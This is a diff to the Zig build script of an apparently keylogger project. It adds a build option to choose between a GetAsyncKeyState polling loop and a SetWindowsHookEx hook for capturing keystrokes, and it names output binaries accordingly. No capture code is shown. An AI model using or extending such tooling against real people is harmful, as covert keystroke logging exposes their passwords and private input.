@@ -1,8 +1,13 @@
 const config = @import("build.zig.zon");
 const std = @import("std");
+const types = @import("src/types.zig");
 const print = std.debug.print;
 const aprint = std.fmt.allocPrint;
 const eql = std.mem.eql;
+
+const BuildError = error{
+    InvalidMethod,
+};
 
 pub fn build(b: *std.Build) !void {
     const version = try std.SemanticVersion.parse(config.version);
@@ -11,13 +16,28 @@ pub fn build(b: *std.Build) !void {
         .preferred_optimize_mode = .small,
     });
     const is_ci = b.option(bool, "ci", "Enable CI mode") orelse false;
+    const method_s = b.option([]const u8, "method", "Method ('loop': GetAsyncKeyState loop; 'hook': SetWindowsHookEx)") orelse "hook";
+
+    const method_e: types.Method = if (eql(u8, method_s, "loop"))
+        .loop
+    else if (eql(u8, method_s, "hook"))
+        .hook
+    else
+        return BuildError.InvalidMethod;
 
     const target_name = try if (is_ci)
-        aprint(b.allocator, "keylogger", .{})
+        aprint(b.allocator, "keylogger-{s}", .{method_s})
     else if (eql(u8, target.result.cpu.model.name, "x86_64"))
-        aprint(b.allocator, "keylogger-{s}", .{@tagName(target.result.cpu.arch)})
+        aprint(b.allocator, "keylogger-{s}-{s}", .{
+            @tagName(target.result.cpu.arch),
+            method_s,
+        })
     else
-        aprint(b.allocator, "keylogger-{s}-{s}", .{ @tagName(target.result.cpu.arch), target.result.cpu.model.name });
+        aprint(b.allocator, "keylogger-{s}-{s}-{s}", .{
+            @tagName(target.result.cpu.arch),
+            target.result.cpu.model.name,
+            method_s,
+        });
 
     print("version: {s}\n", .{config.version});
     print("target arch: {s}\n", .{@tagName(target.result.cpu.arch)});
@@ -25,7 +45,8 @@ pub fn build(b: *std.Build) !void {
     print("target os: {s}\n", .{@tagName(target.result.os.tag)});
     print("target name: {s}\n", .{target_name});
     print("optimize: {s}\n", .{@tagName(optimize)});
-    print("CI: {any}\n", .{is_ci});
+    print("is_ci: {any}\n", .{is_ci});
+    print("method: {s}\n", .{method_s});
 
     const translate_c = b.addTranslateC(.{
         .root_source_file = b.path("src/c.h"),
@@ -35,6 +56,7 @@ pub fn build(b: *std.Build) !void {
 
     const build_options = b.addOptions();
     build_options.addOption([]const u8, "VERSION", config.version);
+    build_options.addOption(types.Method, "METHOD", method_e);
 
     const exe_mod = b.createModule(.{
         .root_source_file = b.path("src/main.zig"),
